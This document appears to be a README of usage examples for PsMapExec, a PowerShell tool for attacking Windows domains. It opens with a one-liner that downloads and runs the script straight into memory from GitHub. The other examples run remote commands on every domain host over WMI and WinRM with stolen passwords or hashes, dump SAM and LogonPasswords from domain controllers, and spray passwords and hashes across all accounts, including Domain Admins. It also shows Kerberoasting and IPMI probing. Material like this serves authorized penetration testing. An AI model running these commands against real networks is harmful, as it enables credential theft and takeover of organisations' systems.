# PsMapExec Usage Examples

### Load directly into memory and execute

    IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")

### Execute WMI commands over all systems in the domain using password authentication
 
     PsMapExec -Targets all -Method WMI -Username Admin -Password Pass -Command ""net user""

### Execute WinRM commands over all systems in the domain using hash authentication

    PsMapExec -Targets all -Method WinRM -Username Admin -Hash [Hash] -Command ""net user""

### Check RDP Access against workstations in the domain and using local authentication

    PsMapExec -Targets Workstations -Method RDP -Username LocalAdmin -Password Pass -LocalAuth
 
### Dump SAM on a single system using SMB and a -ticket for authentication

    PsMapExec -Targets DC01.Security.local -Method SMB -Ticket [Base64-Ticket] -Module SAM

### Check SMB Signing on all domain systems

    PsMapExec -Targets All -Method GenRelayList

### Dump LogonPasswords on all Domain Controllers over WinRM

    PsMapExec -Targets DCs -Method WinRM -Username Admin -Password Pass -Module LogonPasswords

### Use WMI to check current user admin access from systems read from a text file

    PsMapExec -Targets C:\temp\Systems.txt -Method WMI

### Spray passwords across all accounts in the domain

    PsMapExec -Method Spray -SprayPassword [Password]

### Spray Hashes across all accounts in the domain

    PsMapExec -Method Spray -SprayHash [Hash]

### Spray Hashes across all Domain Admin group users

    PsMapExec -Targets ""Domain Admins"" -Method Spray -SprayHash [Hash]

### Kerberoast 

    PsMapExec -Method Kerberoast -ShowOutput

### IPMI

    PsMapExec -Targets 192.168.1.0/24 IPMI
